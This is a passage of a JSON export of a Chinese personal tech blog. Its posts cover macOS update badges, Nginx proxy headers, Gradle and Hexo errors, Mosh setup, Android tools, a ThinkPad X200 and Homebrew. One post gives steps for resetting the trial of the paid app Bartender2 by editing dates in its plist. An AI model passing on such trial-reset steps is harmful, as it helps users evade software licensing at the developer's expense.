macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"Homebrew","slug":"Homebrew","permalink":"https://blog.chaosjohn.com/tags/Homebrew/"}]},{"title":"禁用macOS更新提醒角标","slug":"Disable-Update-Badge-of-macOS","date":"2020-11-26T01:23:06.000Z","updated":"2020-12-05T02:23:29.939Z","comments":true,"path":"Disable-Update-Badge-of-macOS.html","link":"","permalink":"https://blog.chaosjohn.com/Disable-Update-Badge-of-macOS.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 近日来，苹果电脑的操作系统 macOS Catalina 接近了生命周期的尾声，新的操作系统 Big Sur 于2020年11月12日已经发布（很有意思的是正式版的首个版本号为11.0.1，而11.0.0并未对外发布，只预装在Apple M1的三台ARM新机上，详见下图，来源于维基百科） 笔者是Mac死忠粉，自 Mac OS X 10.7 Lion 开始用，经历过系统升级还需付费购买的年代（还记得当时是花了128元升级到了 OS X 10.8 Mountain Lion ），跨到开始免费的 OS X 10.9 Mavericks ，直至后来开始抛去 OS X 命名的 macOS Sierra ，然后到 macOS High Sierra ，只要释出第一个版本，笔者就会更新尝鲜。无奈，很明显的感觉到苹果在软件方面的“做工”越来越糙了，尝鲜用户慢慢沦为了”实验小白鼠”以及”bug反馈器”，所以后来的 macOS Majave 和 macOS Catalina ，我放弃了尝鲜，都等到x.4版本释出才决定更新，才堪堪感觉“可以用了”。 macOS Big Sur 这不刚出就被人笑成 Bug Sur ，笔者毅然决然不更它。 可是问题来了，升级提醒小红点真是逼死我了！！！还不是一处！ 系统左上角苹果标🍎，点击下拉菜单，在 系统偏好设置(System Preferences) 处提醒有更新 如果把 系统偏好设置 锁定在Dock栏的话，小红点+1 在 系统偏好设置 内的 软件更新(Software Update) 上，小红点+2 解决策略- 系统版本 小于 10.15.5 or 等于 10.15.6（是的，就是这么奇怪，该策略在10.15.5中被弃用了，但在10.15.6中又放出来了，之后又去掉了，参考） 关闭 系统偏好设置 打开 终端(Terminal) 执行 sudo softwareupdate --ignore &quot;macOS Big Sur&quot;。如果处于 Mojave 想阻止升级到 Catalina, 把命令中的 Big Sur 改成 Catalina即可。 （如果改变主意想接收更新了，执行 sudo softwareupdate --reset-ignored即可恢复） - 系统版本 等于 10.15.5 or 大于 10.15.6 执行: defaults write com.apple.systempreferences AttentionPrefBundleIDs 0 &amp;&amp; killall Dock，小红点就消失了，不再提示升级了 恢复: defaults write com.apple.systempreferences AttentionPrefBundleIDs 1 &amp;&amp; killall Dock 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Skills","slug":"Skills","permalink":"https://blog.chaosjohn.com/tags/Skills/"},{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"}]},{"title":"于2020年末的回归","slug":"Comeback-in-2020","date":"2020-11-25T07:07:01.000Z","updated":"2020-11-25T08:38:45.000Z","comments":true,"path":"Comeback-in-2020.html","link":"","permalink":"https://blog.chaosjohn.com/Comeback-in-2020.html","excerpt":"","text":"是的，我回来了。 距写上一篇文章已经过去3年多了，很汗颜，虽然文章本来就不多。 建站之初，想好好经营这个博客，毕竟我是一个非常乐于分享的技术宅，我想把我学会的，我踩坑的，我创造的，都通过这个博客展示出来。 虽然找借口很不耻，但我不得不解释一下，为啥挺好的抱负却被我荒废了三年之久。 次要原因：工作不得志，职场不称心 主要原因：生活了无希望，前女友掏空我所有的精力，即使把所有的心思都花上，得来的是无休止的挑刺和吵闹。多次分手无果(懂的人自然懂)，认命了，就像一眼看到了人生的终点，对感情和生活完全丧失信心，进而在自己热爱的工作和行业上失去了奋斗的动力。 万幸的是，我最后终于摆脱了前任，并且走出了阴影。更加幸运的是，半年前，我遇到了我的小可爱，她的出现，照亮了我的天空。 我满血复活了！！！ 所以，我回来了！","categories":[],"tags":[]},{"title":"Hexo YAMLException: can not read a block mapping entry","slug":"Hexo-YAMLException-can-not-read-a-block-mapping-entry","date":"2017-10-09T07:28:03.000Z","updated":"2020-12-05T02:23:29.969Z","comments":true,"path":"Hexo-YAMLException-can-not-read-a-block-mapping-entry.html","link":"","permalink":"https://blog.chaosjohn.com/Hexo-YAMLException-can-not-read-a-block-mapping-entry.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 问题好久没写博客，刚刚写了一篇Nginx反向代理获取真实客户端IP，然后执行hexo d -g是报了错：YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 4, column 1: 查错 先来看看刚刚写的Markdown文件 很明显，第四行只是一个分隔符，怎么可能出问题 谷歌一下错误，发现问题所在，其实是第三行的错误，tags:后面没有跟空格，yaml处理出错。参考 捐赠最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"}]},{"title":"Nginx反向代理获取真实客户端IP","slug":"Nginx-Real-Client-IP","date":"2017-10-09T02:51:57.000Z","updated":"2020-12-05T02:23:29.993Z","comments":true,"path":"Nginx-Real-Client-IP.html","link":"","permalink":"https://blog.chaosjohn.com/Nginx-Real-Client-IP.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 起因 此前做了一个小项目，php实现，ip.chaosjohn.com, 可以用命令行来获取当前客户端ip地址，效果如下： 之前是用CaddyServer来运行这个服务，最近把其从CaddyServer迁移到nginx，很顺利的迁移成功。以学习为目的，我在该服务器上用另外一个地址ip.vultr-01.coodiin.com（以下称“反代端”）反向代理到ip.chaosjohn.com（以下称“后端”），却出现问题了，ip读取不正确，显示的是服务器的IP。Nginx配置如下： 问题分析 出现这样的情况的原因是因为，在反向代理的过程中，对于后端而言，反代端就是客户端。 解决 要解决这个问题，则需要把真实的客户端地址告诉后端。那反代端和后端怎么沟通真实的IP地址呢？一个说另一个得听吧，两边都要设置。 反代端 proxy_set_header X-Real-IP $remote_addr; # 设置X-Real-IP为真实来源请求的IP地址 proxy_bind 127.0.0.1; # 规定代理请求的出口地址 后端 set_real_ip_from 127.0.0.1/32; # 只有从这个地址来的请求才会设置真实IP，才会应用X-Real-IP这个header 最后的代码 4. 结语下次打算记录一下php的配置，包含Nginx和CaddyServer。最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://blog.chaosjohn.com/tags/Nginx/"}]},{"title":"破解Mac菜单栏神器 -- Bartender2","slug":"Crack-Bartender2","date":"2016-11-04T06:59:31.000Z","updated":"2020-12-05T02:23:29.931Z","comments":true,"path":"Crack-Bartender2.html","link":"","permalink":"https://blog.chaosjohn.com/Crack-Bartender2.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 题外话真的好久好久没有更新blog了，上篇博客还是今年5月30号。虽然好几次想更两篇，但是。。。懒癌晚期。。。哈哈哈，废话不多说，进入正文。 软件介绍Bartender是一款管理mac菜单栏图标的软件，笔者的mac装了很多很多的应用，很多都会在菜单栏里停驻一个图标，然后顶部的菜单栏悲剧的挤满了。。。用Windows的童鞋都知道，在桌面任务栏右下角都会有一箭头，收起时只显示几个常驻的图标，点击后其他隐藏的图标才会出现。一直搞不明白为什么苹果原生不能增加一个这样的功能呢？应该也不是什么难事呀！Bartender实现的就是这个功能。关于Bartender的详细介绍移步少数派 破解的缘由 笔者其实很愿意为软件花钱（前提是在承受范围内哈哈哈），自打大四进入工作以来，在各类软件&amp;服务上花的钱也有一两千了。比如，Bartender第一代，我就花了$15。然后就一直使用到今年，一直相安无事，直到Bartender出了第二代，优化了界面显示以及加了些小功能，但是都没戳中我痛点，所以就一直没有去改用Bartender2。 但是，9月下旬mac更新了操作系统macOS Sierra，升级完很悲剧的发现，Bartender1已经不兼容改操作系统了，而且显然，作者把重心放在了Bartender2上，估计也不会更新Bartender1了。不得已，只好卸载了1安装上了2。结果发现，1的序列号不能再2上使用，得重新购买($15)或者从1升级到2($7.5)。。。天杀的！！！ 还好有4个星期的试用期，就先用着了。。。但是用着一个会到期的服务，那感觉，就像头上悬着把刀，很不是滋味。。。于是我就开始思考：它是怎么计算试用时间的？ 一番捣鼓后，试用时间被我成功重置，但是不知道这个漏洞会不会被封堵掉，所以直到今天被我再次重置后(期间Bartender2已经升级了好几个版本)，我才确定了我的破解方法的可行性。 破解过程 假设Bartender2试用时间已过期 关闭Bartender2，打开AppCleaner，找到Bartender2那项，点击它，会弹出一个窗口，里面会罗列出与该应用相关的所有配置文件等等。 经猜测锁定”com.surteesstudio.Bartender.plist”，打开翻到最后，果然看到“trialStart”这样的字样，哈哈哈。 用编辑器打开(笔者用的XCode，因为上次直接用Vim编辑保存后Bartender不能识别），把”trialStart”和”trialStart2”改成当前日期的前两天. 大功告成 结语最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Crack","slug":"Crack","permalink":"https://blog.chaosjohn.com/tags/Crack/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"}]},{"title":"解决“Gradle -- Could not find tools.jar”","slug":"Gradle-Could-not-find-tools-jar","date":"2016-05-30T06:48:44.000Z","updated":"2020-12-05T02:23:29.964Z","comments":true,"path":"Gradle-Could-not-find-tools-jar.html","link":"","permalink":"https://blog.chaosjohn.com/Gradle-Could-not-find-tools-jar.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 错误出现的环境 CentOS 7 x86_64 已通过sudo yum install java-1.8.0-openjdk安装OpenJDK8 部署完成的Spring-Boot项目，执行./gradlew bootRun 报错`Could not find tools.jar 该项目在其他的机器上均未出现该问题，包括OSX、Ubuntu和另一台CentOS 解决方案 经StackOverFlow搜索，发现Gradle does not find tools.jar和Correct way of referencing tools.jar in a cross-platform way两篇，主要是通过改build.gradle，强制加入tools的搜寻路径来解决问题。目测有效，但是因为在其他机子上都正常运行不报错，所以放弃该方案。 突然想起来在很多情况下报错都是因为没有安装dev包（或devel包），比如pip安装模块却没有安装python-dev等等。就寻思着，OpenJDK会不会也要安装dev组件呢？ 键入sudo yum search openjdk | grep -i dev进行搜索，果然有java-1.8.0-openjdk-devel sudo yum install java-1.8.0-openjdk-devel，再次./gradlew bootRun，成功运行不报错 结语开发过程中出现问题了，不仅要勤搜索，还要勤动脑思考。最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://blog.chaosjohn.com/tags/Java/"},{"name":"Gradle","slug":"Gradle","permalink":"https://blog.chaosjohn.com/tags/Gradle/"},{"name":"Error","slug":"Error","permalink":"https://blog.chaosjohn.com/tags/Error/"}]},{"title":"Mosh(Mobile Shell) -- 增强版SSH","slug":"Mosh-Imporved-SSH","date":"2016-05-30T06:25:15.000Z","updated":"2020-12-05T02:23:29.986Z","comments":true,"path":"Mosh-Imporved-SSH.html","link":"","permalink":"https://blog.chaosjohn.com/Mosh-Imporved-SSH.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 开场白 Mosh，是Mobile Shell的缩写(Mo+Sh)，是一个增强版的SSH，或者套用官方的话来说，Mosh is a replacement for SSH。 SSH相信大家应该都不陌生，我们都用它来进行远程登录Unix-like的操作系统，比如运行着Linux的云服务器。 SSH有一个很大的弊病，那就是连接会断。比如新建了一个SSH会话，然后突然网断了，SSH就断开连接终止了。 Mosh就是用来解决这个问题的，它可以“漫游”。网断了，重连，或者从一个WiFi切换到另一个WiFi，然后又切换成数据流量，会话一直都在。 另外一个笔者非常喜欢的特点是–本地响应特别快(intelligent local echo)。笔者有好几台国外的服务器，几乎都是美国的。从中国大陆到美国的Ping值一般都超过200ms，有时候甚至在400ms以上，在这种情况下对比SSH与Mosh的表现： SSH：键盘按下每一个字符，比如“a”，远程服务器接收到本地键盘的响应，然后再告诉本地“这边已接到你按下字母a”，这之后，本地的终端才会显示出字母a。假设Ping值是200ms，那么每次按下按键之后，得有400ms的延迟屏幕才有显示，so，打字一卡一卡的很难受，体验很糟糕。 Mosh：键盘每按下一个字符，屏幕上立马就会显示，发送给远程服务器的工作则在后台静默执行，打字非常流畅。 安装 Mac OS X 从pkg软件包安装：OS X 10.5–10.9 &amp;&amp; OS X 10.9+ HomeBrew：$ brew install mosh MacPorts：$ sudo port install mosh Windows - Cygwin: C:\\&gt; setup.exe -q mobile-shell Chrome浏览器：插件Mosh for Chrome Linux Ubuntu/Debian: $ sudo apt-get install mosh ArchLinux: $ sudo pacman -S mosh CentOS/Fedaro：$ sudo yum install mosh FreeBSD: $ sudo pkg install net/mosh 编译安装 下载源码包进行 123456$ wget https://mosh.mit.edu/mosh-1.2.5.tar.gz$ tar xvzf mosh-1.2.5.tar.gz$ cd mosh-1.2.5$ ./configure$ make# make install 从git拉取源码 123456$ git clone https://github.com/mobile-shell/mosh$ cd mosh$ ./autogen.sh$ ./configure$ make# make install 使用方法 基本上和SSH一模一样，直接$ mosh server-address就好了，因为Mosh的本质还是SSH 如果远程主机的SSH端口不是22，比如是2022，则需要$ mosh remotehost --ssh=&quot;ssh -p 2022&quot; 一般来说，远程主机的环境要配置成en_US.UTF-8，不然会报“mosh requires a UTF-8 locale.”之类的异常，根本用不了。琢磨了好久，研究出一套多平台的解决方案。 Linux 12341. 在/etc/environment中追加一句LC_ALL=&quot;en_US.UTF-8&quot;2.A [Ubuntu/Debian] $ sudo locale-gen en_US.UTF-8 2.B [CentOS/Fedaro] $ sudo localedef -v -c -i en_US -f UTF-8 en_US.UTF-83. reboot FreeBSD：只需在~/.login_conf中追加 1234me:\\ :charset=UTF-8:\\ :lang=en_US.UTF-8:\\ :setenv=LC_COLLATE=C: 踩坑 错误Nothing received from the server on UDP port 60003：简单来说，Mosh的网络通信由两部分组成，TCP用于SSH会话+UDP用于会话保持。TCP部分的端口就是SSH的端口，而UDP的端口则是60000~61000之间的随机数。该错误的解决方案将UDP端口加入防火墙的白名单$ sudo iptables -I INPUT 1 -p udp --dport 60000:61000 -j ACCEPT 笔者家里的那台老MacBook作为文件服务器，常年开着不关机，但是从外网通过Mosh访问回去，会出现找不到mosh-server的异常。原因是笔者用HomeBrew安装的Mosh，执行文件被默认放在/usr/local/bin/下，在高版本的OSX下，因安全方面的考虑，该路径不在系统的初始PATH里，所以会找不到mosh-server。解决方法是“显式指定执行文件的路径”：1$ mosh macbook --server&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mosh-server 结语自从两年前发现了这么个利器，在笔者的日常运维中，它已经完全替代了SSH的存在。最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Dev","slug":"Dev","permalink":"https://blog.chaosjohn.com/tags/Dev/"}]},{"title":"安卓平板上的开发者实用工具","slug":"Tools-for-Developers-on-Android-Tablet","date":"2016-05-29T08:52:15.000Z","updated":"2020-12-05T02:23:30.004Z","comments":true,"path":"Tools-for-Developers-on-Android-Tablet.html","link":"","permalink":"https://blog.chaosjohn.com/Tools-for-Developers-on-Android-Tablet.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 1. 测试机型和本文的受众 你得有一块android平板，或者一只超大屏的android手机(类似小米MAX，其实小米Note也凑合)。 你还得是个开发者，本文介绍的工具都是为开发者准备，如果你不是，请拉到文章末尾，就只给你安利GMD GestureControl这一个软件啦🙈。 本文封面的是笔者的小米平板第一代64G版，于15年“双十一”花1099块大洋买了送给女朋友的，后来公司年终抽奖抽到一块iPad mini2，就从女朋友手里把这块安卓板子换回来了（笔者是标准的暖男嚯嚯嚯）。 笔者绝对没有给小米打广告，相反除了这块MiPad之外，笔者只想狠狠地黑小米，比如小米MAX–这货到底是手机还是平板啊；比如说公司花3000块钱买回来的小米Note顶配版–特喵的一天三充而且果然“为发烧而生”。 只有这块14年问世的MiPad，用下来觉得还好，续航很给力，而且“NVIDIA Tegra K1”的CPU，放到现在16年中旬，还能排上号。 笔者虽然是果粉，但是绝对不鄙视android，相反在各类平板中选择的话，我还是比较偏好android的。原因无他，用的顺手。（以后我会写篇文章讲讲我为什么平板选择android，而手机却选择iPhone） 2. 系统版本 小米平板嘛，出厂必须自带MIUI滴。 想把小米平板变成“PC”，还刷过一次RemixOS，但是因为官方没有支持MiPad，只有民间大神制作的兼容包，还只有1.0版本的，虽然用着体验挺好的，最后实在架不住某些蛋疼的bug，还是刷回了MIUI系统。关于RemixOS，如果有感兴趣的，可以去官网下载他们的PC版，安装到u盘上直接插电脑体验，不建议刷到大家的平板上。 为了Root，所以刷了MIUI的开发版本，已升级到MIUI7(Android 4.4.4)，删除了系统的Updater.apk，禁用了自动更新。 3. 必装应用列表 谷歌安装器（需root）：给国内被阉割的安卓系统安装“谷歌服务框架”和“谷歌应用市场”。 ES File Explorer：笔者在安卓平台上用过的最好用的文件管理器，给开发者推荐的原因如下 方便管理已安装应用，还可以备份应用（包括应用数据） 支持ftp/sftp，方便连接本地局域网的电脑或云端的Linux主机，进行传输文件。 Root Explorer（需root）：俗称“RE管理器”，可以直接将系统路径挂载为可写，还可以原生读取应用的db文件。 AirDroid：无线传输文件和管理安卓设备。 从电脑上查看安卓设备的内容（照片、收发短信等） 把电脑当做平板的“键盘”，当电脑上点中Airdroid的窗口后，电脑键盘的输入都会同步到平板上去。 Hacker’s Keyboard：“黑客键盘”，模拟标准的PC键盘，包括F1~F12，ctrl，alt，shift，tab等功能键。非常实用。 Serverauditor：SSH客户端，配色非常小清新，而且跨平台，在iOS和chrome上都有。还能自动判别所连接的主机是什么系统并且给相应的主机加上对应系统的Logo。 ConnectBot：也是一款SSH客户端，官方Github的介绍为“ConnectBot is the first SSH client for Android”。功能比Serverauditor强大，而且Hacker’s Keyboard专门为其做了优化（详见Hacker’s Keyboard的设置页）。 IrssiConnectBot：以ConnectBot为原型的SSH客户端，增加了mosh协议。切记，千万不要去GooglePlay商店安装，那里下载的版本和最基础的ConnectBot一毛一样，根本就没有mosh！请到IrssiConnectBot的官网下载或者点击此处下载或者去它的Github下载源码到本地自己编译。 JuiceSSH：看名称就知道它也是一款SSH客户端了，同样支持mosh协议，而且是mosh官网推荐的mosh客户端。功能非常强大，还支持插件。但是！笔者不喜欢JuiceSSH，因为笔者远程管理主机一般都会使用到Tmux，需要按缀键Ctrl-B来激活，但是JuiceSSH不识别同时按下的Ctrl键和B键，故抛弃。但不妨碍它成为GooglePlay上最畅销的SSH客户端之一。 Shadowsocks：不解释，懂得人自然懂，不懂的人，有“病”的话搜索一下（哈哈哈，其实是bing.com），百度该词已被和谐。当然建议从GooglePlay上安装。 BusyBox（需root）：BusyBox 被称为 Linux 工具里的瑞士军刀.简单的说BusyBox就好像是个大工具箱，它集成压缩了 Linux 的许多工具和命令。Android的本质是Linux，但其底层的一些工具不仅较标准的Linux少很多，已有的几乎也是功能不完善的。BusyBox的作用就是补全和替换掉这些Linux工具。 Linux Deploy（需root和安装BusyBox）：最后祭上的终极杀器，官方Github。简单一句话介绍–“在你的安卓设备上原生跑Linux”。基本原理–“chroot”，想详细了解的可以从这个关键词入手。可以选择的Linux发行版有很多，主流的都有，包括Debian、Ubuntu、CentOS、Arch Linux、Gentoo等等，安装完成后可以通过127.0.0.1:22进行SSH登入。如果平板的空间足够的话，可以同时安装很多个(如下图所示，笔者安装了Arch Linux、Ubuntu和Gentoo)，但只能同时选择一个运行。 GMD GestureControl Lite（需root）：最后的最后，送上的一枚手势软件（并非只为开发者推荐哦）。这边给出的链接是Lite版（非Lite版要价5.55美元），但是Lite版就够用了。羡慕iPad的各种手势吗？四指内抓退回桌面、四指左右横扫切换上一个应用和下一个应用、四指上推显示最近应用列表。。。有了这个软件，这些功能你都能实现！而且实现的更多！简直堪比iOS的越狱插件Activator！ 4. 结语其实还有很多很多其他为开发者准备的软件，如果有读者愿意推荐的话，请在下面给我留言啦，小弟不胜感激！最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Utility","slug":"Utility","permalink":"https://blog.chaosjohn.com/tags/Utility/"},{"name":"Android","slug":"Android","permalink":"https://blog.chaosjohn.com/tags/Android/"},{"name":"Developer","slug":"Developer","permalink":"https://blog.chaosjohn.com/tags/Developer/"}]},{"title":"只为体验小红点--我的“ThinkPad X200”","slug":"My-ThinkPad-X200","date":"2016-05-28T08:50:50.000Z","updated":"2020-12-05T02:23:29.990Z","comments":true,"path":"My-ThinkPad-X200.html","link":"","permalink":"https://blog.chaosjohn.com/My-ThinkPad-X200.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 1. 手贱入坑X200 之前逛知乎逛论坛，经常看到有两拨人打口水仗，非得就“MacBook的触控板和Thinkpad的小红点哪一个好用”争个脸红耳赤。（前者为TrackPad，后者为TrackPoint） 作为一个已经用了四五年MacBook的果粉，笔者之前一直觉得TrackPad是史上最好用的电脑输入设备。以至于笔者一直是TrackPad的重度使用者，电脑包里只有MacBook而从来不携带鼠标，也从来没有使用鼠标的习惯。（PS：笔者是一只非常稀少的不打游戏的雄性程序猿） 看多了“TrackPad Vs. TrackPoint“之争，自然心里痒痒的。咋办哩？那就买一台体验体验！可是ThinkPad还挺贵的，买一台大几千呢，笔者可是勤俭持家的好男人，老婆本可不能随便动。。。于是默默地掏出爪机刷起了闲鱼(🙈捂脸逃) 选机上，笔者看中了ThinkPad X200，经典的小黑，百度百科链接 Intel(R) Core(TM)2 Duo CPU – 至少不是赛扬奔腾之类的处理器 Intel GMA X4500显卡 – 都说了笔者不打游戏了，要独显干嘛，浪费钱？ DDR3 – 还好不是DDR2，不然升级低版本的内存得死贵死贵的，还记得之前有买过一根DDR333的1G内存都花了两百左右 只有TrackPoint，没有触摸板 – 要是有触摸板的话，我怕自己会下意识的用它，那算哪门子的体验小红点呀 闲鱼上的X200大多在600块钱左右，如果配备SSD，价格差不多都飙到八九百，一千多的也有很多。笔者的价格底线是500，唉，怎么那么穷！ X200在笔者的“欲购清单”上待了大半年，时不时地就来闲鱼看看有没有合适的(佩服自己的耐心)。终于在三周前，联系到了一位卖家，与他商议不要内存不要硬盘（笔者有闲置的内存条和硬盘），于是以290的价格成交（包邮）。哇咔咔！ 一周星期的焦急等待后，盼来了X200。拆机，包的还挺严实，打开，按下电源键，还有电，关机。打开后盖，有两个内存插槽，随便插上一根4G的内存，再次开机，居然提示内存错误。原来两个内存插槽还分0号和1号，必须从0号开始使用起。晕死，换了个内存插槽，果然没问题了。再换成两根2G的，也没问题。玩过这么多电脑，还是第一次见到这种状况。随便找个了装了Linux Live的u盘，能正常进入系统，蓝牙Wifi工作都正常。 2. X200初体验 先说说缺点 有两个按键太灵敏，X和K，轻轻碰上去都会打出x和k的字母。X键太灵敏能忍，但是作为VIM党，K键太灵敏就不能忍！扣下键帽，用缝衣针把里面的脏东西挑出来，吹风机吹吹，按回去，居然好了！于是，此缺点从此消失。 底部靠近电源的一个防滑橡胶脚垫掉了，电脑放在桌子上会不稳，经常会有“卡拉卡拉”和桌面轻碰的声音。于是上某宝花了几块钱买了个相同型号的脚垫。该缺点也从此消失。 电池是6芯的，设计容量1723mAh，剩余容量1470mAh，仅为原来的85%，续航只能撑2个小时不到。这个缺点等以后真正有续航需求的时候再考虑解决吧，买个9芯的电池也就一两百块钱。 找不到其他缺点了😀 以下开始进入“拍马屁模式” 成色非常好（见封面图），键盘完全没有油光，用酒精把整机擦拭了一遍后，保守估计95新吧，噢耶赚到了，闲鱼上很多卖的很贵的，看成色都很旧很脏。 重量很轻，1.394KG，笔者的MacBook Air重量也达到了1.35KG，只差44g（脑海里莫名地想起初中物理课本，一个鸡蛋50g） 笔者买的这台X200是P8600的CPU，性能比最早的i3都要强。。。笔者最早的一台MacBook是经典款的“小白”MC207，P7550的CPU，用到现在为止都依然“坚挺”！ 键盘手感很好，比Mac的原装键盘要好，键程适中，弹性不错，手感偏软。 散热真赞！发热真小！电脑开一整天，C面(有键盘的那一面)没有丝毫热感，D面(电脑底部)感觉和人的体温差不多，出风口几乎没有很大的风吹出来，导致整机非常静音，丝毫没有其他电脑风扇为了散热狂转造成的噪音。 Wifi居然支持2.4GHz和5GHz双频段！！！天哪，08年的电脑啊！！！ 3. 体验小红点 其实说是说小红点，但不仅仅是在按键“B”上方的红色的橡胶点，还包括了空格下方的三个按键，从左往右分别对应鼠标的左键、中键和右键。如下图所示。 按住小红点，手指往哪边用力，光标就会往哪边移动。一开始真的很难把握移动的角度和速度，总是很难非常快速地把光标移动到目标位置，用力小了，移动地太慢，用力大了，一下子就移动过头了。还好没有买带触摸板的型号，强迫自己使用小红点半天不到，就差不多能顺畅使用它了。 左键和右键的功能就不说了，如果在浏览网页或文档时，按住中键后再给小红点用力，就能滚屏啦。“哗哗哗”非常顺畅，个人感觉比鼠标滚轮要好用得多，简直能媲美MacBook触控板的双指滚屏，很是喜欢！ 因为尚未在X200上安装过Windows，所以关于小红点在Windows下的表现笔者不进行描述，一般要去ThinkPad官网下载相关驱动以启动。 因为快递刚收到的时候，笔者为了测整机质量，所以就用了一块Linux LiveUSB进行启动，操作系统为最新的Ubuntu 16.04，内置了TrackPoint的驱动，小红点的所有功能都能正常使用。所以读者如果安装Ubuntu系列的操作系统的话，是不用费心再安装相关驱动的，开箱即用。 笔者收到快递当天就在某东买了块120GB的SSD，于是就在这块硬盘上安装了Arch Linux。 Arch Linux的安装不再赘述，直接参照Arch Wiki的新手教程即可，以后有机会我会写篇比较浅显易懂的文章。 那么问题来了，小红点在Arch Linux下只能用作移动光标，而不能用来滚动屏幕。真是愁死了，废了好大劲安装了Arch Linux，结果却不能完全发挥小红点的威力。 在Google上搜索了一番，终于找到了解决方案，在命令行下输入以下开启垂直滚动 123456789 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation&quot; 1 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Button&quot; 2 xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Timeout&quot; 200 ``` * 如果还想开启水平滚动的话，执行 ```bash xinput set-prop &quot;TPPS/2 IBM TrackPoint&quot; &quot;Evdev Wheel Emulation Axes&quot; 6 7 4 5 以上这些xinput命令不是永久性的，每次图形界面(xserver)重启，都得重新执行才能生效。但可以放在.xsessionrc内，当xserver启动时会自动执行。 当然，如果不喜欢命令行的话，也有图形界面程序来解决啦。有两个选择，GPointing Device Settings和configure-trackpoint。笔者在Arch Linux上安装了前者，如下图所示 4. 结语体验下来，MacBook和ThinkPad都很赞，现在这台290收来的X200已经成为了笔者的半个主力机，晚上下班回去，如果不写博客的话，大多数时间是抱着ThinkPad。如果读者也想体验体验的话，上闲鱼收个X200是个很不错的选择，当然，X61也可以考虑哦，虽然性能比X200差，但是最近民间有“厂子”有在开发号称“X62”的主板，具体详见 。最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Toy","slug":"Toy","permalink":"https://blog.chaosjohn.com/tags/Toy/"},{"name":"Hardware","slug":"Hardware","permalink":"https://blog.chaosjohn.com/tags/Hardware/"},{"name":"ThinkPad","slug":"ThinkPad","permalink":"https://blog.chaosjohn.com/tags/ThinkPad/"},{"name":"TrackPoint","slug":"TrackPoint","permalink":"https://blog.chaosjohn.com/tags/TrackPoint/"}]},{"title":"HomeBrew -- OSX下的最强软件包管理器","slug":"HomeBrew-The-Best-Package-Manager-On-OSX","date":"2016-05-26T09:23:57.000Z","updated":"2020-12-05T02:23:29.973Z","comments":true,"path":"HomeBrew-The-Best-Package-Manager-On-OSX.html","link":"","permalink":"https://blog.chaosjohn.com/HomeBrew-The-Best-Package-Manager-On-OSX.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 1. 什么是软件包管理器软件包管理器（以下简称包管理器），是用来管理系统下面软件和程序的工具，负责它们的搜索、安装、更新升级和卸载。 2. 为什么需要包管理器 包管理器一般来说是*nix系统(Unix-like: Linux, Mac OS X, FreeBSD等等)独有的。 Windows的软件生态系统决定了它不需要包管理器，大部分用户都是用它的图形界面，他们所需要做的就是在获取到该软件的安装包(Installer)后，运行后”Next”-&gt;”Next”-&gt;…-&gt;”Finish”，直至安装到某个路径下，创建软件的启动器快捷方式。 *nix系统中除了Mac OS X(以下简称OSX)外，其他的系统的主要用途是作为服务器，用Linux做桌面系统来用的家伙不会很多，大部分都是像我这样的苦逼程序猿，用FreeBSD当桌面使用的更是少之又少。那么作为服务器来用的话，一般都不配备图形界面的，只有命令行接口。原因有二：一、图形界面耗性能啊；二、一般服务器都架在云端，你开个图形界面远程登录上去，鼠标拖动都一卡一卡的，那画面，真是太美不忍看。所以一般的Linux的发行版和FreeBSD都提供了包管理器，让用户能在命令行下比较轻松地管理软件（Debian: apt-get, Redhat/CentOS/Fedora: yum, ArchLinux: pacman）。。。呃，那些热衷于任何软件都要从源代码安装的家伙，有毒，我服！ 不知道是谁说过来着：“MacBook的死忠用户主要有两类：搞设计的和搞IT的”。。。既然搞IT，那肯定离不开命令行。对于我们程序猿来说，OSX真是一个绝妙的组合，既有非常美丽易用的GUI，又有纯*nix的命令行。像ngnix和apache等等这些命令行软件，OSX“出厂”时是没有的，所以要么从下载它们的源代码编译安装，要么就用包管理器来安装。 3. OSX下有哪些包管理器 